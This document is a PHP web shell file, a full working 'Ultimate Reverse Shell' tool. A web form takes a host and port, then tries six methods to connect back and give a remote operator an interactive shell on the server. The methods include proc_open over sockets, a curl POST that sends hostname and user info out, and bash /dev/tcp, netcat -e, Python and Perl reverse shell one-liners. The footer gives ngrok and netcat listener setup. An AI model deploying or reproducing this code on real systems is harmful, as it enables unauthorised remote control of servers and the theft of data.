<?php
// ============================================================
// ULTIMATE REVERSE SHELL - Multi-Method Connection Script
// Version: 2.1 - Fixed Syntax Error
// Description: Tries 6 different methods to establish a reverse shell
// ============================================================

// ============================================================
// CONFIGURATION
// ============================================================
error_reporting(0);
set_time_limit(0);
ignore_user_abort(true);

// ============================================================
// DISPLAY CONNECTION FORM
// ============================================================
function showForm() {
    echo '
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultimate Reverse Shell</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0a, #1a1a2e, #16213e);
            font-family: "Segoe UI", monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(0, 0, 0, 0.9);
            border-radius: 20px;
            padding: 40px;
            max-width: 600px;
            width: 100%;
            border: 1px solid #00ff88;
            box-shadow: 0 0 50px rgba(0, 255, 136, 0.1);
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .header h1 {
            color: #00ff88;
            font-size: 28px;
            margin-bottom: 5px;
        }
        .header p {
            color: #888;
            font-size: 14px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            color: #00ff88;
            margin-bottom: 8px;
            font-weight: bold;
            font-size: 14px;
        }
        .input-group input, .input-group select {
            width: 100%;
            padding: 12px 15px;
            background: #1a1a1a;
            border: 2px solid #333;
            border-radius: 10px;
            color: #fff;
            font-size: 14px;
            transition: all 0.3s;
            font-family: monospace;
        }
        .input-group input:focus, .input-group select:focus {
            outline: none;
            border-color: #00ff88;
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.15);
        }
        .input-group input::placeholder {
            color: #555;
        }
        .input-group select {
            cursor: pointer;
        }
        .input-group select option {
            background: #1a1a1a;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #00ff88, #00b359);
            color: #000;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            font-family: monospace;
        }
        button:hover {
            transform: scale(1.02);
            box-shadow: 0 5px 30px rgba(0, 255, 136, 0.3);
        }
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .info-box {
            margin-top: 20px;
            padding: 15px;
            background: #1a1a1a;
            border-radius: 10px;
            border-left: 4px solid #00ff88;
        }
        .info-box h3 {
            color: #00ff88;
            font-size: 13px;
            margin-bottom: 8px;
        }
        .info-box .method-badges {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
        }
        .method-badge {
            display: inline-block;
            padding: 4px 10px;
            background: #222;
            border-radius: 15px;
            font-size: 11px;
            color: #00ff88;
            border: 1px solid #00ff88;
        }
        .method-badge.failed {
            color: #ff4444;
            border-color: #ff4444;
        }
        .method-badge.success {
            background: #00ff88;
            color: #000;
        }
        .status-message {
            margin-top: 15px;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            font-family: monospace;
            font-size: 14px;
            display: none;
        }
        .status-message.success {
            display: block;
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid #00ff88;
            color: #00ff88;
        }
        .status-message.error {
            display: block;
            background: rgba(255, 68, 68, 0.1);
            border: 1px solid #ff4444;
            color: #ff4444;
        }
        .status-message.info {
            display: block;
            background: rgba(255, 255, 0, 0.1);
            border: 1px solid #ffaa00;
            color: #ffaa00;
        }
        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #00ff88;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .results-table {
            width: 100%;
            margin-top: 15px;
            border-collapse: collapse;
            font-size: 13px;
        }
        .results-table td {
            padding: 8px 12px;
            border-bottom: 1px solid #222;
        }
        .results-table .method-name {
            color: #aaa;
        }
        .results-table .status-icon {
            text-align: right;
        }
        .footer {
            margin-top: 20px;
            text-align: center;
            color: #444;
            font-size: 12px;
        }
        .footer a {
            color: #00ff88;
            text-decoration: none;
        }
        .footer code {
            background: #1a1a1a;
            padding: 2px 6px;
            border-radius: 3px;
            color: #00ff88;
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <div class="header">
            <h1>🔌 Reverse Shell</h1>
            <p>Multi-Method Connection Tool</p>
        </div>
        
        <form method="POST" id="shellForm">
            <div class="input-group">
                <label>🌐 Ngrok Host / IP</label>
                <input type="text" name="host" id="hostInput" 
                       placeholder="e.g., 7.tcp.eu.ngrok.io or 192.168.1.100" required>
            </div>
            
            <div class="input-group">
                <label>🔌 Port Number</label>
                <input type="number" name="port" id="portInput" 
                       placeholder="e.g., 11421" required min="1" max="65535">
            </div>
            
            <div class="input-group">
                <label>🔄 Connection Method</label>
                <select name="method" id="methodSelect">
                    <option value="auto">⚡ Auto (Try All Methods)</option>
                    <option value="fsockopen">Method 1: fsockopen + proc_open</option>
                    <option value="pfsockopen">Method 2: pfsockopen (Persistent)</option>
                    <option value="sockets">Method 3: PHP Sockets Extension</option>
                    <option value="stream">Method 4: Stream Socket</option>
                    <option value="curl">Method 5: CURL + Shell</option>
                    <option value="system">Method 6: System Command</option>
                </select>
            </div>
            
            <button type="submit" id="connectBtn">🚀 Establish Connection</button>
        </form>
        
        <div class="info-box">
            <h3>⚡ Available Connection Methods</h3>
            <div class="method-badges">
                <span class="method-badge">fsockopen</span>
                <span class="method-badge">pfsockopen</span>
                <span class="method-badge">Sockets</span>
                <span class="method-badge">Stream</span>
                <span class="method-badge">CURL</span>
                <span class="method-badge">System</span>
            </div>
        </div>
        
        <div id="statusContainer"></div>
        
        <div class="footer">
            Make sure <strong>ngrok</strong> is running: <code>ngrok tcp 4444</code><br>
            And <strong>netcat</strong> is listening: <code>nc -lvnp 4444</code>
        </div>
    </div>
    
    <script>
        document.getElementById("shellForm").onsubmit = function() {
            var btn = document.getElementById("connectBtn");
            btn.innerHTML = "<span class=\'loading-spinner\'></span> Connecting...";
            btn.disabled = true;
        };
        
        // Auto-fill from URL parameters
        var params = new URLSearchParams(window.location.search);
        if (params.get("host")) {
            document.getElementById("hostInput").value = params.get("host");
        }
        if (params.get("port")) {
            document.getElementById("portInput").value = params.get("port");
        }
    </script>
</body>
</html>';
}

// ============================================================
// METHOD 1: fsockopen + proc_open (Standard)
// ============================================================
function method_fsockopen($host, $port) {
    $sock = @fsockopen($host, $port, $errno, $errstr, 15);
    if ($sock) {
        sendBanner($sock, "fsockopen");
        $descriptorspec = [0 => $sock, 1 => $sock, 2 => $sock];
        $shell = file_exists('/bin/bash') ? '/bin/bash' : '/bin/sh';
        $process = proc_open($shell, $descriptorspec, $pipes);
        if (is_resource($process)) proc_close($process);
        fclose($sock);
        return true;
    }
    return false;
}

// ============================================================
// METHOD 2: pfsockopen (Persistent Connection)
// ============================================================
function method_pfsockopen($host, $port) {
    $sock = @pfsockopen($host, $port, $errno, $errstr, 15);
    if ($sock) {
        sendBanner($sock, "pfsockopen");
        while (!feof($sock)) {
            $cmd = fgets($sock, 1024);
            if (trim($cmd) == 'exit') break;
            if (trim($cmd) == '') continue;
            $output = shell_exec(trim($cmd) . " 2>&1");
            fwrite($sock, $output . "\n");
            fwrite($sock, "shell> ");
        }
        fclose($sock);
        return true;
    }
    return false;
}

// ============================================================
// METHOD 3: PHP Sockets Extension
// ============================================================
function method_sockets($host, $port) {
    if (!extension_loaded('sockets')) return false;
    
    $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if ($sock === false) return false;
    
    $result = @socket_connect($sock, $host, $port);
    if ($result === false) {
        socket_close($sock);
        return false;
    }
    
    sendBanner($sock, "PHP Sockets", true);
    socket_write($sock, "shell> ");
    
    while (true) {
        $cmd = @socket_read($sock, 1024, PHP_NORMAL_READ);
        if ($cmd === false) break;
        $cmd = trim($cmd);
        if ($cmd == 'exit') break;
        if (empty($cmd)) continue;
        
        $output = shell_exec($cmd . " 2>&1");
        @socket_write($sock, $output . "\n");
        @socket_write($sock, "shell> ");
    }
    
    socket_close($sock);
    return true;
}

// ============================================================
// METHOD 4: Stream Socket
// ============================================================
function method_stream($host, $port) {
    $context = stream_context_create([
        'socket' => ['bindto' => '0:0', 'backlog' => 128]
    ]);
    
    $sock = @stream_socket_client("tcp://{$host}:{$port}", $errno, $errstr, 15, 
                                   STREAM_CLIENT_CONNECT, $context);
    
    if ($sock) {
        sendBanner($sock, "Stream Socket");
        $descriptorspec = [0 => $sock, 1 => $sock, 2 => $sock];
        $shell = file_exists('/bin/bash') ? '/bin/bash' : '/bin/sh';
        $process = proc_open($shell, $descriptorspec, $pipes);
        if (is_resource($process)) proc_close($process);
        fclose($sock);
        return true;
    }
    return false;
}

// ============================================================
// METHOD 5: CURL (HTTP-based)
// ============================================================
function method_curl($host, $port) {
    if (!function_exists('curl_init')) return false;
    
    $url = "http://{$host}:{$port}";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'hostname' => gethostname(),
        'user' => exec('whoami'),
        'cmd' => 'id'
    ]));
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return ($response !== false);
}

// ============================================================
// METHOD 6: System Command (exec, shell_exec, system)
// ============================================================
function method_system($host, $port) {
    // Try different system command approaches
    $commands = [];
    
    // Bash reverse shell
    $commands[] = "bash -i >& /dev/tcp/{$host}/{$port} 0>&1";
    
    // Netcat reverse shell
    $commands[] = "nc {$host} {$port} -e /bin/bash";
    $commands[] = "nc -e /bin/bash {$host} {$port}";
    
    // Python reverse shell
    $commands[] = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{$host}\",{$port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'";
    
    // Perl reverse shell
    $commands[] = "perl -e 'use Socket;\$i=\"{$host}\";\$p={$port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'";
    
    foreach ($commands as $cmd) {
        @exec($cmd . " > /dev/null 2>&1 &");
        usleep(100000); // Small delay between attempts
    }
    
    // Return true if any command might have worked
    return true;
}

// ============================================================
// SEND BANNER / SYSTEM INFO
// ============================================================
function sendBanner($sock, $method, $isSocket = false) {
    $info = [
        'hostname' => gethostname(),
        'user' => exec('whoami'),
        'uid' => exec('id -u'),
        'gid' => exec('id -g'),
        'os' => php_uname(),
        'php' => phpversion(),
        'dir' => getcwd(),
        'ip' => @$_SERVER['SERVER_ADDR'] ?: 'Unknown'
    ];
    
    $banner = "
╔═══════════════════════════════════════════════════════════╗
║          🔌 REVERSE SHELL CONNECTED 🔌                    ║
╠═══════════════════════════════════════════════════════════╣
║ Method: " . str_pad($method, 52) . " ║
║ Hostname: " . str_pad($info['hostname'], 50) . " ║
║ User: " . str_pad($info['user'] . " (UID:" . $info['uid'] . ")", 50) . " ║
║ OS: " . str_pad($info['os'], 54) . " ║
║ PHP: " . str_pad($info['php'], 55) . " ║
║ Directory: " . str_pad($info['dir'], 48) . " ║
╠═══════════════════════════════════════════════════════════╣
║ Commands: Type 'exit' to disconnect                      ║
╚═══════════════════════════════════════════════════════════╝

";
    
    if ($isSocket) {
        @socket_write($sock, $banner);
        @socket_write($sock, "shell> ");
    } else {
        @fwrite($sock, $banner);
    }
}

// ============================================================
// TRY ALL METHODS
// ============================================================
function tryAllMethods($host, $port) {
    $methods = [
        'fsockopen' => 'method_fsockopen',
        'pfsockopen' => 'method_pfsockopen',
        'sockets' => 'method_sockets',
        'stream' => 'method_stream',
        'curl' => 'method_curl',
        'system' => 'method_system'
    ];
    
    $results = [];
    $success = false;
    $successMethod = '';
    
    foreach ($methods as $name => $func) {
        if (function_exists($func)) {
            if ($func($host, $port)) {
                $results[$name] = '✅ Success';
                $success = true;
                $successMethod = $name;
                break; // Stop on first success
            } else {
                $results[$name] = '❌ Failed';
            }
        } else {
            $results[$name] = '⚠️ Not Available';
        }
    }
    
    return ['success' => $success, 'method' => $successMethod, 'results' => $results];
}

// ============================================================
// TEST CONNECTION (Pre-check)
// ============================================================
function testConnection($host, $port, $maxAttempts = 3) {
    for ($i = 1; $i <= $maxAttempts; $i++) {
        $testSock = @fsockopen($host, $port, $errno, $errstr, 5);
        if ($testSock) {
            fclose($testSock);
            return ['success' => true, 'attempt' => $i];
        }
        sleep(1);
    }
    return ['success' => false, 'error' => $errstr, 'code' => $errno];
}

// ============================================================
// DISPLAY RESULTS PAGE
// ============================================================
function showResults($host, $port, $method, $testResult, $connectionResult) {
    $statusClass = $connectionResult['success'] ? 'success' : 'error';
    $statusIcon = $connectionResult['success'] ? '✅' : '❌';
    $statusText = $connectionResult['success'] 
        ? "Connected successfully using: " . ucfirst($connectionResult['method'])
        : "All connection methods failed!";
    
    echo '
<!DOCTYPE html>
<html>
<head>
    <title>Connection Results</title>
    <style>
        body { background: #0a0a0a; color: #00ff88; font-family: monospace; padding: 50px; }
        .container { max-width: 700px; margin: auto; background: #111; padding: 30px; border-radius: 15px; border: 1px solid #00ff88; }
        h2 { text-align: center; }
        .status { padding: 15px; border-radius: 8px; margin: 20px 0; text-align: center; font-size: 16px; }
        .status.success { background: rgba(0,255,136,0.1); border: 1px solid #00ff88; color: #00ff88; }
        .status.error { background: rgba(255,68,68,0.1); border: 1px solid #ff4444; color: #ff4444; }
        .status.info { background: rgba(255,255,0,0.1); border: 1px solid #ffaa00; color: #ffaa00; }
        table { width: 100%; border-collapse: collapse; margin: 15px 0; }
        td { padding: 10px; border-bottom: 1px solid #222; }
        .method-name { color: #aaa; }
        .method-status { text-align: right; }
        .success-text { color: #00ff88; }
        .failed-text { color: #ff4444; }
        .back-link { display: block; text-align: center; margin-top: 20px; color: #00ff88; text-decoration: none; }
        .back-link:hover { text-decoration: underline; }
        .details { font-size: 13px; color: #666; margin-top: 10px; padding: 10px; background: #0a0a0a; border-radius: 5px; }
        .details code { background: #1a1a1a; padding: 2px 6px; border-radius: 3px; color: #00ff88; }
    </style>
</head>
<body>
    <div class="container">
        <h2>📊 Connection Results</h2>
        
        <div class="status ' . $statusClass . '">
            ' . $statusIcon . ' ' . $statusText . '
        </div>
        
        <div class="details">
            <strong>Target:</strong> ' . htmlspecialchars($host) . ':' . (int)$port . '<br>
            <strong>Method:</strong> ' . ucfirst(htmlspecialchars($method)) . '<br>
            <strong>Connection Test:</strong> ' . ($testResult['success'] ? '✅ Passed' : '❌ Failed') . '
            ' . (!$testResult['success'] ? ' (Error: ' . htmlspecialchars($testResult['error']) . ')' : '') . '
        </div>';
    
    if (!$connectionResult['success']) {
        echo '
        <div class="status info">
            🔧 Troubleshooting Tips:<br>
            1. Make sure ngrok is running: <code>ngrok tcp 4444</code><br>
            2. Check netcat listener: <code>nc -lvnp 4444</code><br>
            3. Verify host and port are correct<br>
            4. Check firewall settings<br>
            5. Try the "Auto" method to attempt all options
        </div>';
    }
    
    echo '
        <h3>📋 Method Results</h3>
        <table>';
    
    foreach ($connectionResult['results'] as $name => $status) {
        $statusClass2 = strpos($status, '✅') !== false ? 'success-text' : 'failed-text';
        echo '
        <tr>
            <td class="method-name">' . ucfirst($name) . '</td>
            <td class="method-status ' . $statusClass2 . '">' . $status . '</td>
        </tr>';
    }
    
    echo '
        </table>
        
        <a href="" class="back-link">← Try Again</a>
    </div>
</body>
</html>';
}

// ============================================================
// MAIN HANDLER
// ============================================================
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['host']) && isset($_POST['port'])) {
    $host = trim($_POST['host']);
    $port = (int)$_POST['port'];
    $method = $_POST['method'];
    
    // Validate input
    if (empty($host) || $port <= 0 || $port > 65535) {
        echo '<h2 style="color:red;">❌ Invalid input. Please check host and port.</h2>';
        echo '<a href="">← Go Back</a>';
        exit;
    }
    
    // Test connection first
    $testResult = testConnection($host, $port);
    
    // Try to establish reverse shell
    if ($method == 'auto') {
        $connectionResult = tryAllMethods($host, $port);
    } else {
        // Try specific method
        $funcName = "method_" . $method;
        $results = [];
        $success = false;
        $successMethod = '';
        
        if (function_exists($funcName)) {
            if ($funcName($host, $port)) {
                $results[$method] = '✅ Success';
                $success = true;
                $successMethod = $method;
            } else {
                $results[$method] = '❌ Failed';
            }
        } else {
            $results[$method] = '⚠️ Not Available';
        }
        
        $connectionResult = [
            'success' => $success,
            'method' => $successMethod,
            'results' => $results
        ];
    }
    
    // Show results
    showResults($host, $port, $method, $testResult, $connectionResult);
    
} else {
    showForm();
}
?>
